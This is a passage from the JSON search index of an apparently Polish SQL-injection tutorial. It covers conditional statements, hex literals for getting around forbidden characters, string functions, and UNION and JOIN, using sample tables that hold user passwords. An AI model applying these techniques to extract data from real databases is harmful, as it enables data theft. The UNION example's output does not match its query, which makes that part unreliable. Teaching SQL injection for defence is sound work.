wykonaj_je\u015bli_fa\u0142sz END;","title":"PostgreSQL"},{"location":"web/sqlinjection/#oracle","text":"BEGIN IF warunek THEN wykonaj_jesli_prawda; ELSE wykonaj_je\u015bli_fa\u0142sz; END IF; END;","title":"Oracle"},{"location":"web/sqlinjection/#liczby-szesnastkowe","text":"S\u0105 one szczeg\u00f3lnie przydatne w przypadku gdy jakie\u015b znaki s\u0105 zakazane. 56 == 0x38","title":"Liczby szesnastkowe"},{"location":"web/sqlinjection/#znaki-i-ciagi-znakow","text":"SELECT CHAR(0x41); - zwr\u00f3ci znak ASCII o warto\u015bci szesnastkowej 0x41 SELECT ASCII('a'); - zwr\u00f3ci warto\u015b\u0107 dziesi\u0119tn\u0105 litery wysuni\u0119tej najbardziej na lewo w ci\u0105gu znak\u00f3w SELECT CONCAT(str1, str2, str3, ...); - konkatencja string\u00f3w ( tylko MySQL ) SELECT 'A' || 'B' || 'C'; - konkatencja string\u00f3w; zwr\u00f3ci ABC","title":"Znaki i ci\u0105gi znak\u00f3w"},{"location":"web/sqlinjection/#union","text":"Unie s\u0105 bardzo przydatne gdy potrzebujemy wyci\u0105gn\u0105\u0107 dane z wielu tabel maj\u0105c do dyspozycji tylko jedno zapytanie. Uwaga Unie wymagaj\u0105 takiej samej ilo\u015bci kolumn w obu zapytaniach, kt\u00f3re \u0142\u0105cz\u0105 Wyobra\u017amy sobie dwie tabele: u\u017cytkownicy id nazwa has\u0142o 1 admin admin12345 2 user pass12345 komputery id user_id model 1 2 Lenovo Yoga 2 1 Dell Inspiron Do dyspozycji mamy tylko zapytanie 1 SELECT nazwa , id FROM u\u017cytkownicy ; Otrzymamy w ten spos\u00f3b jedn\u0105 list\u0119 rekord\u00f3w z nazwami u\u017cytkownik\u00f3w i ich has\u0142ami nazwa has\u0142o admin admin12345 user pass12345 Aby wy\u015bwietli\u0107 dodatkowo zawarto\u015b\u0107 kolumny model z tabeli komputery za pomoc\u0105 unii nale\u017cy wykona\u0107 polecenie 1 SELECT nazwa , id FROM u\u017cytkownicy UNION SELECT model , 1 FROM komputery ; Zauwa\u017cmy, \u017ce wymuszone zosta\u0142y tutaj sta\u0142e warto\u015bci 1 aby ilo\u015b\u0107 kolumn w obu wyra\u017ceniach SELECT po\u0142\u0105czonych uni\u0105 si\u0119 zgadza\u0142a. W ten spos\u00f3b otrzymamy wynik: nazwa has\u0142o admin admin12345 user pass12345 Lenovo Yoga 1 Dell Inspiron 1 Graficznie wygl\u0105da to nast\u0119puj\u0105co","title":"Union"},{"location":"web/sqlinjection/#join","text":"Join \u0142\u0105czy dane z dw\u00f3ch zapyta\u0144 w jedn\u0105 tabel\u0119. Ka\u017cdy wiersz tabeli wynikowej zawiera elementy z obu zbior\u00f3w. Wykonany zostaje na tabelach tzw. iloczyn kartezja\u0144ski czyli ka\u017cdy element z jednej tabeli ma odwzorowanie w elementach drugiej tabeli. Wyobra\u017amy sobie dwie tabele: u\u017cytkownicy id nazwa has\u0142o 1 admin admin12345 2 user pass12345 komputery id user_id model 1 2 Lenovo Yoga 2 1 Dell Inspiron Za\u0142\u00f3\u017cmy, \u017ce chcemy zobaczy\u0107 komputery u\u017cytkownika admin . Mo\u017cemy to osi\u0105gna\u0107 poleceniem: 1 SELECT * FROM u\u017cytkownicy AS u JOIN komputery AS k ON u . id = k . user_id ; W odpowiedzi otrzymamy: u.id u.nazwa u.has\u0142o k.id k.user_id k.model 1 admin admin12345 2 1 Dell Inspiron Graficznie wygl\u0105da to nast\u0119puj\u0105co","title":"Join"},{"location":"web/sqlinjection/#inne","text":"Info Wi\u0119cej przyk\u0142ad\u00f3w znale\u017a\u0107 mo\u017cna tutaj lub tutaj","title":"Inne"}]}